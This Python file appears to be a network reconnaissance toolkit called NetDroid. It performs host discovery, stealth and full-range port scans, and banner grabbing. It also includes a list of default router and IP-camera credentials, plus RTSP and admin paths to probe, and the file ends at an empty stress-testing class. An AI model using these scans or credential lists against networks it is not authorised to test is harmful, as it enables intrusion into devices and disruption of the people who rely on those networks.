#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║  NetDroid — Professional WiFi Network Analysis Toolkit      ║
║  Single-file · Termux-ready · No root required              ║
║  Cyberpunk terminal UI · Military-grade logic                ║
╚══════════════════════════════════════════════════════════════╝
"""

# ─── Windows UTF-8 fix (must run before rich import) ─────────
import sys
import os
if sys.platform == "win32":
    os.environ.setdefault("PYTHONIOENCODING", "utf-8")
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ─────────────────────────── stdlib ───────────────────────────
import argparse
import asyncio
import html
import ipaddress
import json
import math
import os
import platform
import random
import re
import shutil
import socket
import struct
import subprocess
import sys
import textwrap
import threading
import time
import traceback
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

# ─────────────────────── third-party ──────────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.text import Text
    from rich.live import Live
    from rich.layout import Layout
    from rich.columns import Columns
    from rich import box
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import nmap
    HAS_NMAP = True
except ImportError:
    HAS_NMAP = False

# ═══════════════════════ CONSTANTS ════════════════════════════
VERSION = "1.0.0"
GITHUB_RAW_URL = "https://raw.githubusercontent.com/SEU_USER/SEU_REPO/main/NetDroid.py"
GITHUB_VERSION_URL = "https://raw.githubusercontent.com/SEU_USER/SEU_REPO/main/VERSION"
NETBIOS_MESSAGE = "O relogio bate as 4"
DEFAULT_SCAN_MODE = "normal"
STRESS_MAX_DURATION = 300
CONCURRENT_LIMIT = 500
PING_TIMEOUT = 1
SCAN_TIMEOUT = 2
BANNER_TIMEOUT = 3
IS_WINDOWS = platform.system().lower() == "windows"

# ─────────────────── color palette ────────────────────────────
C_RED = "#ff003c"    # Cyberpunk Red
C_GREEN = "#00ff9f"  # Matrix/Neon Green
C_YELLOW = "#fdee00" # Cyber Yellow
C_CYAN = "#00d4ff"   # Electric Blue
C_WHITE = "#fafafa"  # Pure White
C_DIM = "#444444"    # Deep Grey
C_BG = "#050505"     # Near Black
C_PURPLE = "#bc13fe" # Neon Purple

# ─────────────────── port databases ───────────────────────────
TOP20_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
               143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]

TOP100_PORTS = [7, 9, 13, 21, 22, 23, 25, 26, 37, 53, 79, 80, 81, 88, 106,
                110, 111, 113, 119, 135, 139, 143, 144, 179, 199, 389, 427,
                443, 444, 445, 465, 513, 514, 515, 543, 544, 548, 554, 587,
                631, 646, 873, 990, 993, 995, 1025, 1026, 1027, 1028, 1029,
                1110, 1433, 1720, 1723, 1755, 1900, 2000, 2001, 2049, 2121,
                2717, 3000, 3128, 3306, 3389, 3986, 4899, 5000, 5009, 5051,
                5060, 5101, 5190, 5357, 5432, 5631, 5666, 5800, 5900, 6000,
                6001, 6646, 7070, 8000, 8008, 8009, 8080, 8081, 8443, 8888,
                9100, 9999, 10000, 32768, 49152, 49153, 49154, 49155, 49156]

IOT_PORTS = [554, 8000, 8080, 8443, 8888, 37777, 34567, 80, 443, 49152]

SERVICE_MAP = {
    7: "echo", 9: "discard", 13: "daytime", 21: "ftp", 22: "ssh",
    23: "telnet", 25: "smtp", 37: "time", 53: "dns", 79: "finger",
    80: "http", 81: "http-alt", 88: "kerberos", 106: "poppassd",
    110: "pop3", 111: "rpcbind", 113: "ident", 119: "nntp",
    135: "msrpc", 139: "netbios-ssn", 143: "imap", 179: "bgp",
    389: "ldap", 443: "https", 445: "microsoft-ds", 465: "smtps",
    513: "rlogin", 514: "syslog", 515: "printer", 543: "klogin",
    548: "afp", 554: "rtsp", 587: "submission", 631: "ipp",
    873: "rsync", 993: "imaps", 995: "pop3s", 1433: "mssql",
    1723: "pptp", 1900: "upnp", 2049: "nfs", 3000: "grafana",
    3128: "squid", 3306: "mysql", 3389: "rdp", 5000: "upnp",
    5060: "sip", 5432: "postgresql", 5631: "pcanywhere",
    5800: "vnc-http", 5900: "vnc", 6000: "x11", 8000: "http-alt",
    8008: "http-alt", 8009: "ajp13", 8080: "http-proxy",
    8081: "http-alt", 8443: "https-alt", 8888: "http-alt",
    9100: "jetdirect", 9999: "abyss", 10000: "webmin",
    27017: "mongodb", 6379: "redis", 11211: "memcached",
    37777: "dahua", 34567: "dahua-alt", 49152: "upnp-nat",
}

# ─────────────── MAC vendor prefix (offline) ─────────────────
MAC_VENDORS = {
    "00:1A:2B": "Ayecom", "00:50:56": "VMware", "00:0C:29": "VMware",
    "00:1C:42": "Parallels", "08:00:27": "VirtualBox",
    "AC:DE:48": "Apple", "3C:22:FB": "Apple", "F0:18:98": "Apple",
    "A4:83:E7": "Apple", "DC:A6:32": "Raspberry Pi",
    "B8:27:EB": "Raspberry Pi", "E4:5F:01": "Raspberry Pi",
    "00:E0:4C": "Realtek", "48:5B:39": "Realtek",
    "00:1A:3F": "Samsung", "00:21:19": "Samsung",
    "58:CB:52": "Samsung", "AC:5F:3E": "Samsung",
    "C0:25:E9": "TP-Link", "50:C7:BF": "TP-Link",
    "14:CC:20": "TP-Link", "EC:08:6B": "TP-Link",
    "60:32:B1": "TP-Link", "B0:BE:76": "TP-Link",
    "10:FE:ED": "TP-Link", "98:DA:C4": "TP-Link",
    "00:1E:58": "D-Link", "1C:7E:E5": "D-Link",
    "28:10:7B": "D-Link", "C4:A8:1D": "D-Link",
    "A8:DA:0C": "Hikvision", "C0:56:E3": "Hikvision",
    "44:19:B6": "Hikvision", "BC:AD:28": "Hikvision",
    "3C:EF:8C": "Dahua", "40:2C:76": "Dahua",
    "D4:43:A8": "Dahua", "E0:50:8B": "Dahua",
    "04:D9:F5": "ASUS", "2C:56:DC": "ASUS",
    "60:45:CB": "ASUS", "F0:79:59": "ASUS",
    "CC:2D:E0": "MikroTik", "4C:5E:0C": "MikroTik",
    "D4:CA:6D": "MikroTik", "6C:3B:6B": "MikroTik",
    "B4:75:0E": "Belkin", "94:10:3E": "Belkin",
    "C0:56:27": "Belkin", "EC:1A:59": "Belkin",
    "00:14:BF": "Linksys", "C0:56:27": "Linksys",
    "20:AA:4B": "Linksys", "58:6D:8F": "Linksys",
    "00:0E:8F": "Cisco", "00:1B:D5": "Cisco",
    "F4:CF:E2": "Cisco", "B0:AA:77": "Cisco",
    "00:24:D7": "Intel", "3C:97:0E": "Intel",
    "68:05:CA": "Intel", "A4:C4:94": "Intel",
    "38:2C:4A": "ASUSTek", "00:1F:C6": "ASUSTek",
    "74:D4:35": "Giga-Byte", "00:1B:FC": "ASRock",
    "54:B2:03": "Huawei", "00:E0:FC": "Huawei",
    "48:46:FB": "Huawei", "CC:A2:23": "Huawei",
    "7C:B0:C2": "Intel", "00:26:18": "ASUSTek",
    "F8:1A:67": "TP-Link", "18:A6:F7": "TP-Link",
}

# ──────────── default credentials database ────────────────────
DEFAULT_CREDS = {
    "generic": [("admin", "admin"), ("admin", "1234"), ("admin", "password"),
                ("admin", "12345"), ("root", "root"), ("user", "user"),
                ("admin", ""), ("root", ""), ("admin", "123456")],
    "dahua": [("admin", "admin"), ("admin", ""), ("888888", "888888")],
    "hikvision": [("admin", "12345"), ("admin", "admin")],
    "tp-link": [("admin", "admin"), ("admin", "")],
    "asus": [("admin", "admin"), ("admin", "password")],
    "mikrotik": [("admin", ""), ("admin", "admin")],
    "d-link": [("admin", ""), ("admin", "admin"), ("admin", "password")],
    "linksys": [("admin", "admin"), ("", "admin")],
    "cisco": [("cisco", "cisco"), ("admin", "admin")],
    "huawei": [("admin", "admin"), ("telecomadmin", "admintelecom")],
}

# ────────────── RTSP paths to test ───────────────────────────
RTSP_PATHS = ["/live", "/stream", "/ch01", "/video1", "/cam/realmonitor",
              "/Streaming/Channels/101", "/live/ch00_0", "/h264",
              "/mpeg4", "/channel1", "/media/video1", "/11", "/12"]

# ────────────── API endpoints to probe ────────────────────────
API_ENDPOINTS = ["/api/", "/cgi-bin/", "/admin/", "/login", "/status",
                 "/config.xml", "/deviceinfo", "/system", "/info",
                 "/ISAPI/System/deviceInfo", "/common/info.cgi"]

# ════════════════════ BANNER ASCII ════════════════════════════
BANNER = r"""
[bold #ff003c]
    _   __     __     ____             _     __
   / | / /__  / /_   / __ \_________  (_)___/ /
  /  |/ / _ \/ __/  / / / / ___/ __ \/ / __  / 
 / /|  /  __/ /_   / /_/ / /  / /_/ / / /_/ /  
/_/ |_/\___/\__/  /_____/_/   \____/_/\__,_/   
[/bold #ff003c]
[dim #555555]          ⟨ Professional Network Analysis Toolkit ⟩[/dim #555555]
[dim #555555]              v{version} · No Root · Termux Ready[/dim #555555]
"""

# ══════════════════ TERMINAL UI ═══════════════════════════════

class TerminalUI:
    """Cyberpunk terminal interface powered by rich."""

    def __init__(self):
        if HAS_RICH:
            try:
                self.console = Console(force_terminal=True, theme=None)
            except Exception:
                self.console = Console()
        else:
            self.console = None
        self.start_time = time.time()

    def boot_sequence(self):
        if not self.console:
            return
        
        stages = [
            ("Initializing Neural Link...", 0.3),
            ("Loading NetDroid Kernels...", 0.4),
            ("Syncing Network Protocols...", 0.3),
            ("Calibrating Port Sensors...", 0.5),
            ("Establishing Secure Sandbox...", 0.2),
        ]
        
        with Live(vertical_overflow="visible", console=self.console) as live:
            for msg, duration in stages:
                live.update(Panel(f"[bold {C_CYAN}]{msg}[/]", border_style=C_DIM))
                time.sleep(duration)
            
            # Glitch effect animation
            for _ in range(3):
                live.update(Panel(f"[bold {C_RED}]SYSTEM ONLINE[/]", border_style=C_RED))
                time.sleep(0.1)
                live.update(Panel(f"[bold {C_WHITE}]SYSTEM ONLINE[/]", border_style=C_WHITE))
                time.sleep(0.1)
        
        self.console.clear()
        self.banner()

    def banner(self):
        if self.console:
            try:
                self.console.print(BANNER.format(version=VERSION))
                self.console.print(f"  [{C_DIM}]Launch Time:[/] [bold {C_PURPLE}]{datetime.now().strftime('%H:%M:%S')}[/]\n")
            except (UnicodeEncodeError, Exception):
                print(f"\n  NetDroid v{VERSION} — Network Analysis Toolkit\n")
        else:
            print(f"\n  NetDroid v{VERSION} — Network Analysis Toolkit\n")

    def info(self, msg: str):
        if self.console:
            self.console.print(f"  [{C_CYAN}]➤[/{C_CYAN}] {msg}")
        else:
            print(f"  [*] {msg}")

    def success(self, msg: str):
        if self.console:
            self.console.print(f"  [{C_GREEN}]✔[/{C_GREEN}] {msg}")
        else:
            print(f"  [+] {msg}")

    def warn(self, msg: str):
        if self.console:
            self.console.print(f"  [{C_YELLOW}]⚡[/{C_YELLOW}] {msg}")
        else:
            print(f"  [!] {msg}")

    def error(self, msg: str):
        if self.console:
            self.console.print(f"  [{C_RED}]☢[/{C_RED}] {msg}")
        else:
            print(f"  [-] {msg}")

    def section(self, title: str):
        if self.console:
            p = Panel(
                Text(title, justify="center", style=f"bold {C_WHITE}"),
                border_style=C_RED,
                box=box.HORIZONTALS,
                padding=(0, 2)
            )
            self.console.print(f"\n")
            self.console.print(p)
        else:
            print(f"\n{'=' * 40}\n {title}\n{'=' * 40}")

    def table(self, title: str, columns: List[Tuple[str, str]], rows: List[List[str]]):
        if self.console:
            t = Table(title=title, box=box.SIMPLE_HEAVY, border_style=C_RED,
                      title_style=f"bold {C_WHITE}", header_style=f"bold {C_CYAN}")
            for name, style in columns:
                t.add_column(name, style=style)
            for row in rows:
                t.add_row(*row)
            self.console.print(t)
        else:
            print(f"\n  {title}")
            for row in rows:
                print(f"    {'  |  '.join(row)}")

    def progress(self, description: str = "Working"):
        if self.console:
            return Progress(
                SpinnerColumn("dots", style=C_RED),
                TextColumn(f"[{C_WHITE}]{{task.description}}[/{C_WHITE}]"),
                BarColumn(bar_width=30, style=C_DIM, complete_style=C_RED),
                TextColumn(f"[{C_GREEN}]{{task.percentage:>3.0f}}%[/{C_GREEN}]"),
                TimeElapsedColumn(),
                console=self.console,
            )
        return None

    def elapsed(self) -> str:
        e = time.time() - self.start_time
        return f"{e:.1f}s"

    def consent(self, message: str) -> bool:
        if self.console:
            self.console.print(f"\n  [{C_YELLOW}]⚠ {message}[/{C_YELLOW}]")
        else:
            print(f"\n  [!] {message}")
        try:
            resp = input("  ➤ Confirmar? [y/N]: ").strip().lower()
            return resp in ("y", "yes", "s", "sim")
        except (KeyboardInterrupt, EOFError):
            return False


# ═════════════════ NETWORK DETECTOR ═══════════════════════════

class NetworkDetector:
    """Auto-detect gateway, subnet, local IP, SSID. Creates output dir."""

    def __init__(self, ui: TerminalUI, target: Optional[str] = None):
        self.ui = ui
        self.target = target
        self.gateway: Optional[str] = None
        self.local_ip: Optional[str] = None
        self.subnet: Optional[str] = None
        self.ssid: Optional[str] = None
        self.iface: Optional[str] = None
        self.output_dir: Optional[Path] = None

    def detect(self) -> bool:
        self.ui.section("NETWORK DETECTION")
        if self.target:
            self.ui.info(f"Target manual: [bold]{self.target}[/bold]")
            self._resolve_target()
        else:
            self._auto_detect()
        if not self.local_ip:
            self.ui.error("Falha ao detectar rede. Use --t para definir alvo manual.")
            return False
        self._detect_ssid()
        self._create_output_dir()
        self._print_summary()
        return True

    def _resolve_target(self):
        try:
            net = ipaddress.ip_network(self.target, strict=False)
            self.subnet = str(net)
            self.gateway = str(next(net.hosts()))
        except ValueError:
            self.subnet = f"{self.target}/32"
            self.gateway = self.target
        self._detect_local_ip()

    def _auto_detect(self):
        self._detect_gateway_linux()
        if not self.gateway:
            self._detect_gateway_socket()
        if self.gateway:
            self._detect_local_ip()
            if self.local_ip and not self.subnet:
                net = ipaddress.ip_network(f"{self.local_ip}/24", strict=False)
                self.subnet = str(net)

    def _detect_gateway_linux(self):
        if IS_WINDOWS:
            self._detect_gateway_windows()
            return
        try:
            out = subprocess.check_output(["ip", "route"], text=True, timeout=5)
            for line in out.splitlines():
                if line.startswith("default"):
                    parts = line.split()
                    gw_idx = parts.index("via") + 1 if "via" in parts else -1
                    if gw_idx > 0:
                        self.gateway = parts[gw_idx]
                    if "dev" in parts:
                        self.iface = parts[parts.index("dev") + 1]
                    break
        except Exception:
            pass

    def _detect_gateway_windows(self):
        try:
            out = subprocess.check_output(
                ["ipconfig"], text=True, timeout=5, encoding="cp850",
                errors="ignore")
            for line in out.splitlines():
                line = line.strip()
                if "Default Gateway" in line or "Gateway padr" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        gw = parts[1].strip()
                        if gw and re.match(r"\d+\.\d+\.\d+\.\d+", gw):
                            self.gateway = gw
                            return
        except Exception:
            pass

    def _detect_gateway_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            parts = self.local_ip.rsplit(".", 1)
            self.gateway = f"{parts[0]}.1"
        except Exception:
            pass

    def _detect_local_ip(self):
        if self.local_ip:
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.gateway or "8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            pass

    def _detect_ssid(self):
        if IS_WINDOWS:
            self._detect_ssid_windows()
            return
        methods = [
            ["termux-wifi-connectioninfo"],
            ["iwgetid", "-r"],
            ["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"],
        ]
        for cmd in methods:
            try:
                out = subprocess.check_output(cmd, text=True, timeout=5).strip()
                if cmd[0] == "termux-wifi-connectioninfo":
                    data = json.loads(out)
                    ssid = data.get("ssid", "").strip('"')
                    if ssid and ssid != "<unknown ssid>":
                        self.ssid = ssid
                        return
                elif cmd[0] == "nmcli":
                    for line in out.splitlines():
                        if line.startswith("yes:"):
                            self.ssid = line.split(":", 1)[1]
                            return
                elif out:
                    self.ssid = out
                    return
            except Exception:
                continue
        self.ssid = "UnknownNetwork"

    def _detect_ssid_windows(self):
        try:
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"],
                text=True, timeout=5, encoding="cp850", errors="ignore")
            for line in out.splitlines():
                line = line.strip()
                if "SSID" in line and "BSSID" not in line:
                    parts = line.split(":", 1)
                    if len(parts) >= 2:
                        ssid = parts[1].strip()
                        if ssid:
                            self.ssid = ssid
                            return
        except Exception:
            pass
        self.ssid = "UnknownNetwork"

    def _create_output_dir(self):
        safe_name = re.sub(r'[^\w\-.]', '_', self.ssid or "scan")
        self.output_dir = Path(safe_name)
        self.output_dir.mkdir(exist_ok=True)

    def _print_summary(self):
        rows = [
            ["Local IP", self.local_ip or "N/A"],
            ["Gateway", self.gateway or "N/A"],
            ["Subnet", self.subnet or "N/A"],
            ["SSID", self.ssid or "N/A"],
            ["Interface", self.iface or "N/A"],
            ["Output Dir", str(self.output_dir or "N/A")],
        ]
        self.ui.table("Network Info", [("Parameter", C_CYAN), ("Value", C_GREEN)], rows)

    def get_hosts(self) -> List[str]:
        try:
            net = ipaddress.ip_network(self.subnet, strict=False)
            return [str(h) for h in net.hosts()]
        except Exception:
            return []


# ═════════════════ HOST DISCOVERY ═════════════════════════════

class HostDiscovery:
    """ARP cache, ping sweep, TCP probe, TTL fingerprint, MAC vendor."""

    def __init__(self, ui: TerminalUI, detector: NetworkDetector):
        self.ui = ui
        self.det = detector
        self.hosts: List[Dict[str, Any]] = []
        self._arp_cache: Dict[str, str] = {}

    async def discover(self) -> List[Dict[str, Any]]:
        self.ui.section("HOST DISCOVERY")
        self._read_arp_cache()
        candidates = self.det.get_hosts()
        if not candidates:
            self.ui.error("Nenhum host candidato encontrado.")
            return []
        self.ui.info(f"Subnet: {self.det.subnet} — {len(candidates)} hosts possíveis")
        alive = await self._ping_sweep(candidates)
        tcp_extra = await self._tcp_probe_missing(candidates, alive)
        alive.update(tcp_extra)
        for ip in sorted(alive, key=lambda x: ipaddress.ip_address(x)):
            host = self._build_host_info(ip, alive[ip])
            self.hosts.append(host)
        self._print_results()
        return self.hosts

    def _read_arp_cache(self):
        if IS_WINDOWS:
            self._read_arp_cache_windows()
            return
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4 and parts[2] != "0x0":
                        ip, mac = parts[0], parts[3].upper()
                        if mac != "00:00:00:00:00:00":
                            self._arp_cache[ip] = mac
            if self._arp_cache:
                self.ui.success(f"ARP cache: {len(self._arp_cache)} entradas lidas")
        except FileNotFoundError:
            self.ui.warn("ARP cache indisponível (não-Linux)")
        except Exception:
            pass

    def _read_arp_cache_windows(self):
        try:
            out = subprocess.check_output(
                ["arp", "-a"], text=True, timeout=5, errors="ignore")
            for line in out.splitlines():
                line = line.strip()
                m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([-\da-fA-F]+)\s+", line)
                if m:
                    ip = m.group(1)
                    mac = m.group(2).upper().replace("-", ":")
                    if mac != "FF:FF:FF:FF:FF:FF":
                        self._arp_cache[ip] = mac
            if self._arp_cache:
                self.ui.success(f"ARP cache: {len(self._arp_cache)} entradas lidas")
        except Exception:
            pass

    async def _ping_sweep(self, candidates: List[str]) -> Dict[str, float]:
        alive: Dict[str, float] = {}
        sem = asyncio.Semaphore(CONCURRENT_LIMIT)

        async def ping_one(ip: str):
            async with sem:
                try:
                    cmd = (["ping", "-n", "1", "-w", str(PING_TIMEOUT * 1000), ip]
                           if IS_WINDOWS else
                           ["ping", "-c", "1", "-W", str(PING_TIMEOUT), ip])
                    proc = await asyncio.create_subprocess_exec(
                        *cmd, stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.DEVNULL)
                    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=PING_TIMEOUT + 1)
                    if proc.returncode == 0:
                        out = stdout.decode(errors="ignore")
                        m = re.search(r"time[=<]\s*([\d.]+)", out)
                        latency = float(m.group(1)) if m else 0.0
                        alive[ip] = latency
                except Exception:
                    pass

        progress = self.ui.progress("Ping Sweep")
        if progress:
            with progress:
                task = progress.add_task("Ping sweep...", total=len(candidates))
                batch_size = 50
                for i in range(0, len(candidates), batch_size):
                    batch = candidates[i:i + batch_size]
                    await asyncio.gather(*[ping_one(ip) for ip in batch])
                    progress.update(task, advance=len(batch))
        else:
            await asyncio.gather(*[ping_one(ip) for ip in candidates])

        self.ui.success(f"Ping sweep: {len(alive)} hosts responderam")
        return alive

    async def _tcp_probe_missing(self, candidates: List[str],
                                  alive: Dict[str, float]) -> Dict[str, float]:
        missing = [ip for ip in candidates if ip not in alive]
        if not missing:
            return {}
        found: Dict[str, float] = {}
        probe_ports = [80, 443, 22, 8080, 8443]
        sem = asyncio.Semaphore(CONCURRENT_LIMIT)

        async def probe(ip: str):
            async with sem:
                for port in probe_ports:
                    try:
                        _, w = await asyncio.wait_for(
                            asyncio.open_connection(ip, port), timeout=1.0)
                        w.close()
                        await w.wait_closed()
                        found[ip] = 0.0
                        return
                    except Exception:
                        continue

        self.ui.info(f"TCP probe em {len(missing)} hosts silenciosos...")
        batch_size = 100
        for i in range(0, len(missing), batch_size):
            batch = missing[i:i + batch_size]
            await asyncio.gather(*[probe(ip) for ip in batch])

        if found:
            self.ui.success(f"TCP probe: +{len(found)} hosts adicionais")
        return found

    def _build_host_info(self, ip: str, latency: float) -> Dict[str, Any]:
        mac = self._arp_cache.get(ip, "N/A")
        vendor = self._lookup_vendor(mac)
        os_guess = self._ttl_fingerprint(ip)
        is_gw = ip == self.det.gateway
        return {
            "ip": ip, "mac": mac, "vendor": vendor, "os": os_guess,
            "latency_ms": round(latency, 2), "is_gateway": is_gw,
            "ports": [], "services": {},
        }

    def _lookup_vendor(self, mac: str) -> str:
        if mac == "N/A":
            return "Unknown"
        prefix = mac[:8].upper()
        return MAC_VENDORS.get(prefix, "Unknown")

    def _ttl_fingerprint(self, ip: str) -> str:
        try:
            cmd = (["ping", "-n", "1", "-w", "1000", ip]
                   if IS_WINDOWS else
                   ["ping", "-c", "1", "-W", "1", ip])
            out = subprocess.check_output(
                cmd,
                text=True, timeout=3, stderr=subprocess.DEVNULL)
            m = re.search(r"ttl[=:](\d+)", out, re.IGNORECASE)
            if m:
                ttl = int(m.group(1))
                if ttl <= 64:
                    return "Linux/Android"
                elif ttl <= 128:
                    return "Windows"
                else:
                    return "iOS/Cisco/Network"
        except Exception:
            pass
        return "Unknown"

    def _print_results(self):
        if not self.hosts:
            self.ui.warn("Nenhum host ativo encontrado.")
            return
        rows = []
        for h in self.hosts:
            gw = " [GW]" if h["is_gateway"] else ""
            rows.append([
                h["ip"] + gw,
                h["mac"],
                h["vendor"],
                h["os"],
                f"{h['latency_ms']}ms",
            ])
        self.ui.table("Hosts Descobertos",
                       [("IP", C_GREEN), ("MAC", C_CYAN), ("Vendor", C_WHITE),
                        ("OS", C_YELLOW), ("Latency", C_DIM)], rows)


# ═══════════════════ PORT SCANNER ═════════════════════════════

class PortScanner:
    """Asyncio TCP connect scanner with normal/insane/stealth modes."""

    def __init__(self, ui: TerminalUI, mode: str = "normal",
                 custom_ports: Optional[List[int]] = None, insane: bool = False):
        self.ui = ui
        self.mode = mode
        self.insane = insane
        self.ports = self._resolve_ports(custom_ports)
        self.timeout = self._resolve_timeout()

    def _resolve_ports(self, custom: Optional[List[int]]) -> List[int]:
        if custom:
            return sorted(custom)
        if self.mode == "insane" or self.insane:
            return list(range(1, 65536))
        elif self.mode == "stealth":
            return TOP100_PORTS[:]
        return TOP20_PORTS[:]

    def _resolve_timeout(self) -> float:
        if self.mode == "insane" or self.insane:
            return 0.5
        elif self.mode == "stealth":
            return 3.0
        return SCAN_TIMEOUT

    async def scan_host(self, host: Dict[str, Any]) -> Dict[str, Any]:
        ip = host["ip"]
        open_ports = await self._tcp_scan(ip)
        host["ports"] = open_ports
        if open_ports:
            services = await self._grab_banners(ip, open_ports)
            host["services"] = services
        return host

    async def scan_all(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        mode_label = self.mode.upper()
        if self.insane:
            mode_label += " + INSANE"
        self.ui.section(f"PORT SCAN — {mode_label}")
        self.ui.info(f"Portas: {len(self.ports)} | Timeout: {self.timeout}s | Alvos: {len(hosts)}")

        for host in hosts:
            ip = host["ip"]
            self.ui.info(f"Scanning {ip}...")
            await self.scan_host(host)
            if host["ports"]:
                port_list = ", ".join(str(p) for p in host["ports"][:15])
                extra = f" (+{len(host['ports']) - 15} more)" if len(host["ports"]) > 15 else ""
                self.ui.success(f"{ip}: {len(host['ports'])} portas abertas — {port_list}{extra}")
            else:
                self.ui.warn(f"{ip}: nenhuma porta aberta")

        self._print_summary(hosts)
        return hosts

    async def _tcp_scan(self, ip: str) -> List[int]:
        open_ports: List[int] = []
        sem = asyncio.Semaphore(CONCURRENT_LIMIT if not self.mode == "stealth" else 50)

        async def check(port: int):
            async with sem:
                if self.mode == "stealth":
                    await asyncio.sleep(random.uniform(0.05, 0.3))
                try:
                    _, w = await asyncio.wait_for(
                        asyncio.open_connection(ip, port), timeout=self.timeout)
                    w.close()
                    await w.wait_closed()
                    open_ports.append(port)
                except Exception:
                    pass

        progress = self.ui.progress(f"Scanning {ip}")
        if progress and len(self.ports) > 100:
            with progress:
                task = progress.add_task(f"{ip}", total=len(self.ports))
                batch = 500 if self.mode != "stealth" else 25
                for i in range(0, len(self.ports), batch):
                    chunk = self.ports[i:i + batch]
                    await asyncio.gather(*[check(p) for p in chunk])
                    progress.update(task, advance=len(chunk))
        else:
            await asyncio.gather(*[check(p) for p in self.ports])

        return sorted(open_ports)

    async def _grab_banners(self, ip: str, ports: List[int]) -> Dict[int, Dict]:
        services: Dict[int, Dict] = {}
        sem = asyncio.Semaphore(50)

        async def grab(port: int):
            async with sem:
                svc = SERVICE_MAP.get(port, "unknown")
                banner = ""
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(ip, port), timeout=BANNER_TIMEOUT)
                    if port in (80, 443, 8080, 8443, 8000, 8888, 8081):
                        w.write(f"GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
                        await w.drain()
                    data = await asyncio.wait_for(r.read(1024), timeout=BANNER_TIMEOUT)
                    banner = data.decode(errors="ignore").strip()[:200]
                    w.close()
                    await w.wait_closed()
                except Exception:
                    pass
                svc_name = self._identify_service(port, banner, svc)
                services[port] = {"service": svc_name, "banner": banner}

        await asyncio.gather(*[grab(p) for p in ports[:100]])
        return services

    def _identify_service(self, port: int, banner: str, default: str) -> str:
        bl = banner.lower()
        if "ssh" in bl:
            return "ssh"
        if "ftp" in bl:
            return "ftp"
        if "http" in bl or "html" in bl:
            return "http"
        if "smtp" in bl:
            return "smtp"
        if "mysql" in bl:
            return "mysql"
        if "postgresql" in bl:
            return "postgresql"
        if "redis" in bl:
            return "redis"
        if "mongodb" in bl:
            return "mongodb"
        if "telnet" in bl:
            return "telnet"
        if port in IOT_PORTS:
            return f"iot/{default}"
        return default

    def _print_summary(self, hosts: List[Dict[str, Any]]):
        rows = []
        for h in hosts:
            if not h["ports"]:
                continue
            for port in h["ports"][:20]:
                svc = h["services"].get(port, {})
                banner_short = svc.get("banner", "")[:60].replace("\n", " ")
                rows.append([
                    h["ip"], str(port),
                    svc.get("service", SERVICE_MAP.get(port, "?")),
                    banner_short or "—",
                ])
        if rows:
            self.ui.table("Serviços Detectados",
                           [("Host", C_GREEN), ("Port", C_CYAN),
                            ("Service", C_YELLOW), ("Banner", C_DIM)], rows)


# ══════════════════ STRESS ENGINE ═════════════════════════════

class LatencyMonitor:
    """Parallel ping monitor during stress tests."""

    def __init__(self, gateway: str, ui: TerminalUI):
        self.gateway = gateway
        self.ui = ui
        self.running = False
        self.samples: List[Tuple[float, float]] = []
        self.baseline: float = 0.0
        self._thread: Optional[threading.Thread] = None

    def start(self):
        self.running = True
        self._measure_baseline()
        self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._thread.start()

    def stop(self) -> Dict[str, Any]:
        self.running = False
        if self._thread:
            self._thread.join(timeout=3)
        latencies = [s[1] for s in self.samples if s[1] >= 0]
        if not latencies:
            return {"baseline_ms": self.baseline, "avg_ms": 0, "max_ms": 0,
                    "min_ms": 0, "packet_loss_pct": 100, "samples": 0}
        total = len(self.samples)
        lost = sum(1 for s in self.samples if s[1] < 0)
        return {
            "baseline_ms": round(self.baseline, 2),
            "avg_ms": round(sum(latencies) / len(latencies), 2),
            "max_ms": round(max(latencies), 2),
            "min_ms": round(min(latencies), 2),
            "packet_loss_pct": round(lost / total * 100, 1) if total else 0,
            "samples": total,
        }

    def _measure_baseline(self):
        samples = []
        for _ in range(3):
            lat = self._ping_once()
            if lat >= 0:
                samples.append(lat)
        self.baseline = sum(samples) / len(samples) if samples else 0

    def _monitor_loop(self):
        while self.running:
            ts = time.time()
            lat = self._ping_once()
            self.samples.append((ts, lat))
            time.sleep(0.5)

    def _ping_once(self) -> float:
        try:
            cmd = (["ping", "-n", "1", "-w", "1000", self.gateway]
                   if IS_WINDOWS else
                   ["ping", "-c", "1", "-W", "1", self.gateway])
            out = subprocess.check_output(
                cmd,
                text=True, timeout=3, stderr=subprocess.DEVNULL)
            m = re.search(r"time[=<]\s*([\d.]+)", out)
            return float(m.group(1)) if m else -1
        except Exception:
            return -1


class StressEngine:
    """Network stress testing — overfull (aggressive) and overflow (iperf3)."""

